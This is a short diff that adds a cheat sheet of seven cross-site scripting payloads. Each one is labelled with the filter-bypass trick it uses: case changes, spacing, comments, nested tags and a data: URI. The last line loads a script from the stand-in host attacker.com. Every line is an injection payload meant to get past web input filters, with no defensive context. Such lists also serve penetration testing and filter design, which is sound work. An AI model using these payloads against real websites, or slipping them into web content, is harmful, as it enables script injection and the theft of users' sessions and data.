@@ -1,0 +1,7 @@
+<script>alert(1)</script> --> Normal XSS
+<SCRipt>alert(1)</SCRipt> --> Case variation
+<S C R I P T>alert(1)</S C R I P T> --> Spaces
+<script>/**/alert(1)/**/</script> --> Comment bypass
+<scr<script>ipt>alert(1)</scr<script>ipt> --> Nested tags
+<script src=data:text/javascript,alert(1)></script> --> External script injection
+<scrIpt src=//attacker.com/xss.js></scrIpt> --> External source
